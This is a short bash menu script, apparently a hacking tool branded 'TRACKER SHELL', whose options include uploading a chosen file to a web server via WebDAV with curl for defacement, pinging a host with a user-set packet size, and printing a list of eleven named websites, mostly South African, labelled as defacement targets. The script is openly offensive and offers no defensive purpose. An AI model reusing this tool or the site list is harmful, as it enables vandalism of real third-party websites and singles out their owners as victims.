#!/bin/bash
#BOLEH DI REKODE
clear
logo='''
_________________________________
www××××wwww×××www×××××××××××××××××|
www××××wwww×××www×××××××××××××××××|
×www×××wwww×××www_________××××××××|
××wwwwwwwwwwwwwwTRACKER________×××|
×××wwwww  wwwww ______SHELL____×××|
Author:anonymous7770.             |
Git:http://gihub.com/yunanaxploit |
__________________________________|
'''
printf "\033[31m"
echo "$logo"
echo -e '\e[0m'
echo -e "\e[32m[1.]\e[31mVIEW SOURCE WEB"
echo -e "\e[32m[2.]\e[31mDEFACE WEB DAV"
echo -e "\e[32m[3.]\e[31mCREATE HTML "
echo -e "\e[32m[4.]\e[31mLIST WEB DAV"
echo -e "\e[32m[5.]\e[31mPING SERVER"
echo -e "\e[32m[0.]\e[31mEXIT"
read -p "enter menu: " M
if [ $M == '0' ]
then
clear
login
elif [ $M == '1' ]
then
clear
echo -e "\e[35mVIEW SOURCE WEB"
echo
read -p "enter url: " S
clear
curl $S
elif [ $M == '2' ]
then
echo -e "\e[34mDEFACE SHELL"
echo
read -p "enter file: " F
read -p "enter url : " U
curl -T $F $U
elif [ $M == '3' ]
then
echo "CREATE HTML"
read -p "enter name file : " NF
touch $NF
editor $NF
elif [ $M == '4' ]
then
echo "============ LIST DEFACES ============="
echo http://colourfactory.co.za
echo http://chillibitez.co.za
echo http://centraltech.co.za
echo http://windmillsandporcupines.co.za
echo http://mpark.co.za
echo http://ratia.co.za
echo http://itsengineering.co.za
echo http://uzingela.co.za
echo http://cmweb.co.za new
echo http://infussion.co.za new
echo http://savanacloud.com/
elif [ $M == '5' ]
then
echo "PING SERVER"
echo
read -p "enter url : " UR
read -p "enter size pack 4 digit : " P
ping -s $P $UR
else
echo "Menu not found"
fi
